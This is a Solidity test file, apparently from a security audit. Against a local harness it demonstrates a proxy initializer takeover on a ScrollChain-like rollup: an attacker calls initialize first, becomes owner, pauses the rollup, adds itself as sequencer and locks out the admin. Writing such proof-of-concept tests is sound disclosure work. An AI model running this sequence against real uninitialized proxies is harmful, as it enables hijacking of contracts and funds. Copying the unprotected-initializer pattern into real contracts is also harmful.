// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {
    ScrollF1SimpleProxy,
    ScrollChainLike,
    IScrollChainLike
} from "../src/ScrollF1ScrollChainInitHijackHarness.sol";

interface Vm {
    function prank(address msgSender) external;
}

/// @notice Deterministic witness tests for ScrollChain initializer takeover.
contract ScrollF1ScrollChainInitHijackTest {
    Vm private constant vm = Vm(address(uint160(uint256(keccak256("hevm cheat code")))));

    function test_attacker_can_take_owner_via_first_initialize_call() public {
        address admin = address(0xA11CE);
        address attackerEOA = address(0xBEEF);

        ScrollChainLike implementation = new ScrollChainLike();
        ScrollF1SimpleProxy proxy = new ScrollF1SimpleProxy(admin);
        IScrollChainLike rollup = IScrollChainLike(address(proxy));

        vm.prank(admin);
        proxy.upgradeTo(address(implementation));

        vm.prank(attackerEOA);
        rollup.initialize(address(0x1111), address(0x2222), 100);

        require(rollup.owner() == attackerEOA, "attacker should become owner");
    }

    function test_attacker_owner_can_pause_and_set_sequencer() public {
        address admin = address(0xA11CE);
        address attackerEOA = address(0xBEEF);

        ScrollChainLike implementation = new ScrollChainLike();
        ScrollF1SimpleProxy proxy = new ScrollF1SimpleProxy(admin);
        IScrollChainLike rollup = IScrollChainLike(address(proxy));

        vm.prank(admin);
        proxy.upgradeTo(address(implementation));

        vm.prank(attackerEOA);
        rollup.initialize(address(0x1111), address(0x2222), 100);

        vm.prank(attackerEOA);
        rollup.setPause(true);
        require(rollup.paused(), "attacker owner should pause");

        vm.prank(attackerEOA);
        rollup.addSequencer(attackerEOA);
        require(rollup.isSequencer(attackerEOA), "attacker owner should set sequencer");
    }

    function test_legitimate_initializer_is_locked_out_after_attacker_first_call() public {
        address admin = address(0xA11CE);
        address attackerEOA = address(0xBEEF);

        ScrollChainLike implementation = new ScrollChainLike();
        ScrollF1SimpleProxy proxy = new ScrollF1SimpleProxy(admin);
        IScrollChainLike rollup = IScrollChainLike(address(proxy));

        vm.prank(admin);
        proxy.upgradeTo(address(implementation));

        vm.prank(attackerEOA);
        rollup.initialize(address(0x1111), address(0x2222), 100);

        vm.prank(admin);
        (bool ok,) = address(proxy).call(
            abi.encodeWithSelector(IScrollChainLike.initialize.selector, address(0x1111), address(0x3333), 999)
        );
        require(!ok, "legitimate initializer should be locked out");
        require(rollup.owner() == attackerEOA, "attacker ownership should persist");
    }
}
